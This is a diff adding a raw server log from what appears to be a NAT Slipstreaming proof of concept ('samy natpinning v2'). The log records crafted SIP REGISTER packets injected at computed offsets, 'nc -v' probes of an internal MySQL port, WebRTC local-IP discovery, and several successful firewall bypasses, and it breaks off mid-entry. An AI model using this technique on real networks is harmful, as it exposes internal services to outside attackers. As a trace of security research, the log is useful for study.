@@ -1,0 +1,2180 @@
+1.3.3.13 1640197188: Array
+(
+    [C2] => {id:033806102769618196, stuff_bytes:840}
+)
+
+1.3.3.13 1640197328: Array
+(
+    [C6] => {id:0569070698082417, stuff_bytes:840}
+)
+
+1.3.3.13 1640197477: Array
+(
+    [C0] => {id:04803931901479944, stuff_bytes:-4653, orig_stuff_bytes:6167, orig_packet:6841}
+)
+
+1.3.3.13 1640197534: Array
+(
+    [C4] => {id:07159589748271298, stuff_bytes:844}
+)
+
+1.3.3.13 1640197614: Array
+(
+    [C7] => {id:01892563920853393, stuff_bytes:844}
+)
+
+1.3.3.13 1640198644: Array
+(
+    [C0] => {id:09692617238981535, stuff_bytes:842}
+)
+
+1.3.3.13 1640199257: Array
+(
+    [C4] => {id:0924166830840617, stuff_bytes:838}
+)
+
+1.3.3.13 1640199822: Array
+(
+    [C3] => {id:08065168524410218, stuff_bytes:838}
+)
+
+1.3.3.13 1640199881: Array
+(
+    [C5] => {id:013878353591949766, stuff_bytes:842}
+)
+
+1.3.3.13 1640199976: Array
+(
+    [C9] => {id:09004008687658955, stuff_bytes:840}
+)
+
+1.3.3.13 1640200145: Array
+(
+    [C0] => {id:06619565418852277, stuff_bytes:838}
+)
+
+1.3.3.13 1640200231: Array
+(
+    [C1] => {id:05118729003443431, stuff_bytes:840}
+)
+
+1.3.3.13 1640200285: Array
+(
+    [C1] => {id:06423660436617572, stuff_bytes:838}
+)
+
+1.3.3.13 1640200758: Array
+(
+    [C8] => {id:04706385583234699, stuff_bytes:-4653, orig_stuff_bytes:6167, orig_packet:6841}
+)
+
+1.3.3.13 1640200770: Array
+(
+    [C7] => {id:04706385583234699, stuff_bytes:-4653, orig_stuff_bytes:6167, orig_packet:6841}
+)
+
+1.3.3.13 1640200832: Array
+(
+    [C2] => {id:05346026931674172, stuff_bytes:-4652, orig_stuff_bytes:6166, orig_packet:6838}
+)
+
+1.3.3.13 1640200835: Array
+(
+    [C1] => {id:05346026931674172, stuff_bytes:-4652, orig_stuff_bytes:6166, orig_packet:6838}
+)
+
+1.3.3.13 1640200885: Array
+(
+    [C6] => {id:08108967533486375, stuff_bytes:840}
+)
+
+1.3.3.13 1640201099: Array
+(
+    [C6] => {id:08062144814480853, stuff_bytes:842}
+)
+
+1.3.3.13 1640201110: Array
+(
+    [C4] => <b>connected to 1.3.3.13:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 1.3.3.13 3306<br><br><b>status:</b> ip in returned SIP packet is <b>1.3.3.13</b> is no different than what we sent, NAT likely does not have ALG enabled for TCP SIP<br><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------111258157118307678911472025494--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1495<br>old len 1499<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=4 (orig 4), received this packet:
+<i>   ^_
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------153142093914535722991028071801--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=4 (orig 4), received this packet:
+<i>   ^_
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------158211119710358502962085085714--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1499<br>old len 1524<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=25 (orig 25), received this packet:
+<i>   _^_^_^_^_^_^_^_^_^_^_^_
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1316563711854334382279768686--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   _^_^_^_^_^_^_^_^_^_^_^_
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1550473214633484091541254061--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa08062144814480853bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>842 bytes</b><br>beacon received, packet capture lengths: {id:08062144814480853, stuff_bytes:842}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640246383: Array
+(
+    [C5] => {id:0031822193982749436, stuff_bytes:827}
+)
+
+192.168.1.197 1640246439: Array
+(
+    [C1] => {id:02649023115700735, stuff_bytes:827}
+)
+
+192.168.1.197 1640246452: Array
+(
+    [C2] => couldn't reach 192.168.1.197:3306: Connection timed out<br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status:</b> ip in returned SIP packet is <b>1.3.3.13</b> is no different than what we sent, NAT likely does not have ALG enabled for TCP SIP<br><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6351868401871882910804996554--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------24105004818018036201096970593--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1509<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6290615822871500022127340035--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------3371156721266695251716671864--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------15970470771781361086181974699--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=19 (orig 19), received this packet:
+<i>   ^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------416097868465339730596425400--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------70808040710731627991118024882--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa02649023115700735bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>827 bytes</b><br>beacon received, packet capture lengths: {id:02649023115700735, stuff_bytes:827}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640247015: Array
+(
+    [C1] => {id:01489117030411402, stuff_bytes:831}
+)
+
+192.168.1.197 1640247030: Array
+(
+    [C1] => 192.168.1.197:3306: IT WORKS ON MY MACHINE
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------3545388581254241239117079318--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1490<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------7002188851572706461629376126--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------4130688831774142581388326078--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1490<br>old len 1513<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------433883006608226042759264495--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------800005567426251343725552928--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa01489117030411402bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>831 bytes</b><br>beacon received, packet capture lengths: {id:01489117030411402, stuff_bytes:831}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640247139: Array
+(
+    [C8] => {id:010994310738759483, stuff_bytes:831}
+)
+
+192.168.1.197 1640247160: Array
+(
+    [C7] => 192.168.1.197:3306: WORKING
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa010994310738759483bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6643371946658982511451681807--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1513<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa010994310738759483bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------4869229361425055821751462921--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
